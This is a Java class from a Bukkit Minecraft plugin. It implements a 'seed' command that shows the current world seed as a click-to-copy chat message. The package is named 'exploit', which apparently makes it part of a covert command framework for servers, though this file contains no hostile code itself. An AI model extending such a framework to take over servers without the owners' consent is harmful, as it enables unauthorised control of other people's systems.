package com.tmquan2508.exploit.commands;

import com.tmquan2508.exploit.Exploit;

import org.bukkit.*;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.function.Consumer;

import net.md_5.bungee.api.chat.ClickEvent;
import net.md_5.bungee.api.chat.ComponentBuilder;
import net.md_5.bungee.api.chat.HoverEvent;
import net.md_5.bungee.api.chat.TextComponent;

public class SeedCommand extends Command {
    public SeedCommand() { super(); }
    @Override public String getName() { return "seed"; }
    @Override public String getDescription() { return "Gets the current world seed."; }
    @Override public String getUsage() { return ""; }
    @Override public int getRequirePerm() { return 2; }
    @Override public void execute(Player sender, String[] args) {
        String seedString = String.valueOf(sender.getWorld().getSeed());
        ClickEvent clickEvent = new ClickEvent(ClickEvent.Action.COPY_TO_CLIPBOARD, seedString);
        HoverEvent hoverEvent = new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Click to copy!").create() );
        TextComponent message = new TextComponent("World seed: ");
        TextComponent openBracket = new TextComponent("[");
        TextComponent seedComponent = new TextComponent(seedString);
        seedComponent.setColor(ChatColor.GREEN.asBungee());
        seedComponent.setClickEvent(clickEvent);
        seedComponent.setHoverEvent(hoverEvent);
        TextComponent closeBracket = new TextComponent("]");
        message.addExtra(openBracket);
        message.addExtra(seedComponent);
        message.addExtra(closeBracket);
        Exploit.sender.sendMessage(sender, message);
    }
}